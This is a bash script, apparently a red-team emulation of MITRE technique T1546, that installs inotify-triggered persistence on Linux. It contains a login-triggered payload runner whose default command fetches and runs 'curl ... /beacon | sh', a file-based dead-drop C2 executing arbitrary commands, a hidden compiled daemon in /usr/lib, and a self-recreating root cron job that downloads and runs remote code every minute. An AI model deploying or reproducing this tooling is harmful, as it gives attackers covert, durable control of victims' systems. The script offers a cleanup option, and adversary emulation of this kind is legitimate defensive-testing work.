#!/bin/bash
# T1546 — Event Triggered Execution: inotify-Based Trigger
# Execute payload on file system events — event-driven persistence

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_inotify"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1546 — inotify Trigger Execution           ║"
    echo "  ║   Event-driven payload on file changes        ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_inotify_login() {
    echo -e "${CYAN}[*] Deploying inotify login trigger${NC}"
    echo ""

    echo -e "${YELLOW}[*] inotify watches files for events (modify, access, create)."
    echo -e "    Triggers payload when auth.log changes (= someone logs in)."
    echo -e "    Hard to detect — inotify watches aren't easily enumerable.${NC}"
    echo ""

    read -p "  Command on login event: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    if ! command -v inotifywait &>/dev/null; then
        echo -e "${YELLOW}[!] inotifywait not found — using inotify API directly${NC}"
        deploy_inotify_native "$CMD"
        return
    fi

    mkdir -p "$WORKDIR"

    cat > "${WORKDIR}/watch_logins.sh" << WEOF
#!/bin/bash
# ${MARKER} — login event watcher
while true; do
    inotifywait -q -e modify /var/log/auth.log /var/log/secure 2>/dev/null
    # Check for successful login
    if tail -1 /var/log/auth.log 2>/dev/null | grep -q "Accepted\|session opened"; then
        nohup sh -c '${CMD}' &>/dev/null &
    fi
    sleep 2
done
WEOF
    chmod 755 "${WORKDIR}/watch_logins.sh"

    nohup "${WORKDIR}/watch_logins.sh" &>/dev/null &
    local PID=$!

    echo -e "${GREEN}[+] Login trigger active (PID: ${PID})${NC}"
    echo -e "${YELLOW}[*] Fires on every SSH/console login${NC}"
}

deploy_inotify_deadrop() {
    echo -e "${CYAN}[*] Deploying inotify dead-drop C2${NC}"
    echo ""

    echo -e "${YELLOW}[*] Dead-drop C2: watch a file for writes."
    echo -e "    Attacker writes commands to the file, watcher executes them."
    echo -e "    Output written to a separate file for pickup.${NC}"
    echo ""

    local CMDFILE="/dev/shm/.tasks"
    local OUTFILE="/dev/shm/.output"
    read -p "  Command file [${CMDFILE}]: " CUSTOM_CMD
    [[ -n "$CUSTOM_CMD" ]] && CMDFILE="$CUSTOM_CMD"
    read -p "  Output file [${OUTFILE}]: " CUSTOM_OUT
    [[ -n "$CUSTOM_OUT" ]] && OUTFILE="$CUSTOM_OUT"

    touch "$CMDFILE" "$OUTFILE"
    chmod 600 "$CMDFILE" "$OUTFILE"

    mkdir -p "$WORKDIR"

    if command -v inotifywait &>/dev/null; then
        cat > "${WORKDIR}/deadrop.sh" << DEOF
#!/bin/bash
# ${MARKER} — dead-drop C2 watcher
while true; do
    inotifywait -q -e close_write "${CMDFILE}" 2>/dev/null
    if [[ -s "${CMDFILE}" ]]; then
        bash "${CMDFILE}" > "${OUTFILE}" 2>&1
        : > "${CMDFILE}"
    fi
done
DEOF
    else
        # Native approach without inotifywait
        cat > "${WORKDIR}/deadrop.sh" << DEOF
#!/bin/bash
# ${MARKER} — dead-drop C2 (polling fallback)
LAST_MOD=0
while true; do
    CURR_MOD=\$(stat -c %Y "${CMDFILE}" 2>/dev/null || echo 0)
    if [[ "\$CURR_MOD" -gt "\$LAST_MOD" && -s "${CMDFILE}" ]]; then
        bash "${CMDFILE}" > "${OUTFILE}" 2>&1
        : > "${CMDFILE}"
        LAST_MOD=\$CURR_MOD
    fi
    sleep 2
done
DEOF
    fi

    chmod 755 "${WORKDIR}/deadrop.sh"
    nohup "${WORKDIR}/deadrop.sh" &>/dev/null &
    local PID=$!

    echo -e "${GREEN}[+] Dead-drop C2 active (PID: ${PID})${NC}"
    echo -e "${GREEN}[+] Command file: ${CMDFILE}${NC}"
    echo -e "${GREEN}[+] Output file: ${OUTFILE}${NC}"
    echo -e "${YELLOW}[*] Usage: echo 'id; whoami' > ${CMDFILE}${NC}"
    echo -e "${YELLOW}[*] Read output: cat ${OUTFILE}${NC}"
}

deploy_inotify_native() {
    local CMD="$1"
    mkdir -p "$WORKDIR"

    # Compile a C inotify watcher for when inotifywait isn't available
    cat > "${WORKDIR}/inotify_watch.c" << CEOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/inotify.h>

#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + 16))

int main() {
    daemon(0, 0);
    int fd = inotify_init();
    if (fd < 0) return 1;

    int wd = inotify_add_watch(fd, "/var/log/auth.log", IN_MODIFY);
    if (wd < 0)
        wd = inotify_add_watch(fd, "/var/log/secure", IN_MODIFY);
    if (wd < 0) return 1;

    char buf[BUF_LEN];
    while (1) {
        int len = read(fd, buf, BUF_LEN);
        if (len > 0) {
            system("${CMD}");
            sleep(5); /* debounce */
        }
    }
    return 0;
}
CEOF

    if command -v gcc &>/dev/null; then
        gcc -o "${WORKDIR}/inotify_watch" "${WORKDIR}/inotify_watch.c" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            cp "${WORKDIR}/inotify_watch" /usr/lib/.libinotify_helper
            /usr/lib/.libinotify_helper &
            echo -e "${GREEN}[+] Native inotify watcher deployed${NC}"
            return
        fi
    fi
    echo -e "${RED}[!] Compilation failed — install inotify-tools package${NC}"
}

deploy_inotify_cron_guard() {
    echo -e "${CYAN}[*] Deploying inotify cron guard (re-install on deletion)${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    read -p "  File to protect (will be re-created if deleted): " PROTECT_FILE
    [[ -z "$PROTECT_FILE" ]] && PROTECT_FILE="/etc/cron.d/syscheck"
    read -p "  Content to maintain in protected file: " CONTENT
    [[ -z "$CONTENT" ]] && CONTENT="* * * * * root curl -s http://10.0.0.1:8080/b|sh"

    mkdir -p "$WORKDIR"
    # Ensure the file exists with our content
    echo "$CONTENT" > "$PROTECT_FILE"

    cat > "${WORKDIR}/guard.sh" << GEOF
#!/bin/bash
# ${MARKER} — file guard (recreate on deletion)
while true; do
    inotifywait -q -e delete_self -e moved_from "$(dirname ${PROTECT_FILE})" 2>/dev/null
    sleep 1
    if [[ ! -f "${PROTECT_FILE}" ]]; then
        echo '${CONTENT}' > "${PROTECT_FILE}"
    fi
done
GEOF
    chmod 755 "${WORKDIR}/guard.sh"
    nohup "${WORKDIR}/guard.sh" &>/dev/null &

    echo -e "${GREEN}[+] File guard active — ${PROTECT_FILE} will self-heal${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up inotify triggers...${NC}"

    pkill -f "watch_logins\|deadrop\|inotify_watch\|libinotify_helper\|guard.sh" 2>/dev/null
    rm -f /usr/lib/.libinotify_helper
    rm -f /dev/shm/.tasks /dev/shm/.output
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] inotify triggers removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy login event trigger"
    echo -e "  ${CYAN}[2]${NC} Deploy dead-drop C2"
    echo -e "  ${CYAN}[3]${NC} Deploy file guard (self-healing persistence)"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) deploy_inotify_login ;;
        2) deploy_inotify_deadrop ;;
        3) deploy_inotify_cron_guard ;;
        4) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
